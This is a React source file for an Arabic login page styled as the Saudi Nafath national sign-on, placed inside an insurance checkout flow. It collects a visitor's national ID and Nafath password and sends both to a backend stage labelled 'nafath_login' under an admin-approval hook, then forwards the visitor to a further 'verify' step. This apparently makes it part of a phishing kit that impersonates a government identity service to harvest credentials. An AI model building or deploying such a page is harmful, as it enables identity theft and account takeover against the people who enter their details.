import { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Loader2, User, Lock, LogIn, Info } from "lucide-react";
import { motion } from "framer-motion";
import VerificationLayout from "@/components/VerificationLayout";
import { createOrUpdateStage } from "@/hooks/useAdminApproval";
import { linkVisitorToSession } from "@/lib/visitorLink";
import { toast } from "sonner";
import { useLanguage } from "@/i18n/LanguageContext";

const NafathLogin = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const nl = t.nafathLogin;
  const offer = location.state?.offer;
  const phone = location.state?.phone;
  const carrier = location.state?.carrier;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
  const [showPassword, setShowPassword] = useState(false);

  const handleCredentialsSubmit = async () => {
    if (!username || !password) {
      setError(nl.error);
      return;
    }
    setLoading(true);
    try {
      sessionStorage.setItem("nafath_id", username);
      linkVisitorToSession({ national_id: username });
      const id = await createOrUpdateStage(orderId, "nafath_login", { national_id: username, nafath_password: password });
      setOrderId(id);
      if (id) sessionStorage.setItem("insurance_order_id", id);
      toast.success(nl.verified);
      navigate("/insurance/nafath-verify", { state: { offer, phone, carrier, nationalId: username, orderId: id } });
    } catch (err) {
      toast.error("حدث خطأ، حاول مرة أخرى");
      setLoading(false);
    }
  };

  const inputWrapperCls = "relative flex items-center";
  const inputCls = "w-full pl-3 pr-10 py-3 rounded-xl bg-background border-2 border-border text-foreground placeholder:text-muted-foreground text-sm focus:outline-none focus:border-[#11998e] focus:ring-2 focus:ring-[#11998e]/20 transition-all text-right";
  const iconCls = "absolute right-3 w-4 h-4 text-muted-foreground pointer-events-none";

  return (
    <VerificationLayout title={nl.title} subtitle={nl.subtitle}>
      <div className="px-5 pb-5 pt-14">
        <motion.div
          className="space-y-4"
          initial={{ opacity: 0, y: 12 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.4 }}
        >
          {/* Form fields */}
          <div className="space-y-3">
            <motion.div
              initial={{ opacity: 0, x: 10 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 0.1 }}
            >
              <label className="block text-xs font-semibold text-foreground mb-1.5 text-right">رقم الهوية</label>
              <div className={inputWrapperCls}>
                <User className={iconCls} />
                <input className={inputCls} placeholder={nl.usernamePlaceholder} value={username}
                  onChange={(e) => { setUsername(e.target.value); setError(""); }} dir="rtl" />
              </div>
            </motion.div>

            <motion.div
              initial={{ opacity: 0, x: 10 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 0.2 }}
            >
              <label className="block text-xs font-semibold text-foreground mb-1.5 text-right">كلمة المرور</label>
              <div className={inputWrapperCls}>
                <Lock className={iconCls} />
                <input className={inputCls} type={showPassword ? "text" : "password"} placeholder={nl.passwordPlaceholder} value={password}
                  onChange={(e) => { setPassword(e.target.value); setError(""); }} dir="rtl" />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute left-3 text-muted-foreground hover:text-foreground transition-colors text-[10px]"
                >
                  {showPassword ? "إخفاء" : "عرض"}
                </button>
              </div>
            </motion.div>

            {error && (
              <motion.p
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="text-[10px] text-destructive text-right"
              >
                {error}
              </motion.p>
            )}
          </div>

          {/* Login button */}
          <motion.button
            onClick={handleCredentialsSubmit}
            disabled={loading || !username || !password}
            className="w-full text-white hover:opacity-90 rounded-xl py-3 font-bold text-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 shadow-lg"
            style={{ backgroundColor: '#11998e' }}
            whileTap={{ scale: 0.98 }}
            initial={{ opacity: 0, y: 8 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.3 }}
          >
            {loading ? (
              <Loader2 className="w-4 h-4 animate-spin" />
            ) : (
              <LogIn className="w-4 h-4" />
            )}
            <span>{loading ? nl.processing : nl.login}</span>
          </motion.button>

          {/* Info box */}
          <motion.div
            className="bg-[#11998e]/5 border border-[#11998e]/20 rounded-xl p-3.5 text-center"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.4 }}
          >
            <div className="flex items-center justify-center gap-1.5 mb-1.5">
              <Info className="w-3.5 h-3.5 text-[#11998e]" />
              <p className="text-xs font-bold text-foreground">{nl.platformTitle}</p>
            </div>
            <p className="text-[10px] text-muted-foreground leading-relaxed">{nl.platformDesc}</p>
          </motion.div>
        </motion.div>
      </div>
    </VerificationLayout>
  );
};

export default NafathLogin;
